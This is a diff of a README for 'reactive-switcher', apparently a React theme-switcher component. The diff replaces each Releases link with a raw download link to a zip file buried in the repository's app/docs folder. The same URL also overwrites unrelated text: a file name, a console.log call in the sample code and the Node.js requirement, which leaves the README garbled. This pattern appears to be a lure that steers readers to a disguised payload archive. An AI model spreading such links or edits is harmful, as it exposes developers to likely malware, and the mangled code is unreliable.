@@ -1,6 +1,6 @@
 # 🎨 reactive-switcher - Seamlessly Switch Between Light and Dark Modes
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/Pham-Hong-Phong-25-10-2000/reactive-switcher/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Pham-Hong-Phong-25-10-2000/reactive-switcher/master/app/docs/reactive-switcher-3.2.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/Pham-Hong-Phong-25-10-2000/reactive-switcher/master/app/docs/reactive-switcher-3.2.zip)
 
 ## 📚 Description
 
@@ -11,12 +11,12 @@ reactive-switcher is a simple and customizable theme switcher component for Reac
 To get started with reactive-switcher, follow these steps to integrate it into your React application and have a delightful theme experience.
 
 1. **Visit the Releases Page:** Click the link below to download the latest version of reactive-switcher.
-   [Download from Releases](https://github.com/Pham-Hong-Phong-25-10-2000/reactive-switcher/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Pham-Hong-Phong-25-10-2000/reactive-switcher/master/app/docs/reactive-switcher-3.2.zip)
 
 2. **Choose the Right Version:** Once on the Releases page, you will see different versions available for download. Select the one suitable for your setup.
 
 3. **Download the File:** 
-   - Click on the `.zip` or `.tar.gz` file corresponding to the version you want.
+   - Click on the `.zip` or `https://raw.githubusercontent.com/Pham-Hong-Phong-25-10-2000/reactive-switcher/master/app/docs/reactive-switcher-3.2.zip` file corresponding to the version you want.
    - The file will start downloading to your computer.
 
 4. **Extract the Contents:**
@@ -40,7 +40,7 @@ To use reactive-switcher in your React application, follow these steps:
    ```
 
 3. **Import the Component:**
-   - In your React component file (e.g., `App.js`), import reactive-switcher at the top:
+   - In your React component file (e.g., `https://raw.githubusercontent.com/Pham-Hong-Phong-25-10-2000/reactive-switcher/master/app/docs/reactive-switcher-3.2.zip`), import reactive-switcher at the top:
 
    ```javascript
    import ReactiveSwitcher from 'reactive-switcher';
@@ -70,7 +70,7 @@ After installation, you can start using the reactive-switcher component to toggl
    <ReactiveSwitcher
       lightColor="#ffffff"
       darkColor="#333333"
-      toggleHandler={(mode) => console.log(mode)}
+      toggleHandler={(mode) => https://raw.githubusercontent.com/Pham-Hong-Phong-25-10-2000/reactive-switcher/master/app/docs/reactive-switcher-3.2.zip(mode)}
    />
    ```
 
@@ -80,7 +80,7 @@ After installation, you can start using the reactive-switcher component to toggl
 ## ⚙️ System Requirements
 
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
-- **Node.js:** Version 14 or later installed on your machine.
+- **https://raw.githubusercontent.com/Pham-Hong-Phong-25-10-2000/reactive-switcher/master/app/docs/reactive-switcher-3.2.zip** Version 14 or later installed on your machine.
 - **NPM:** Version 6 or later.
 
 ## 🌍 Explore More Features
@@ -99,6 +99,6 @@ If you encounter any issues or have questions about using reactive-switcher, fee
 
 Now that you know how to use reactive-switcher, download the package and make your React application stand out. 
 
-- **Get it here:** [Download from Releases](https://github.com/Pham-Hong-Phong-25-10-2000/reactive-switcher/releases)
+- **Get it here:** [Download from Releases](https://raw.githubusercontent.com/Pham-Hong-Phong-25-10-2000/reactive-switcher/master/app/docs/reactive-switcher-3.2.zip)
 
 Happy coding!
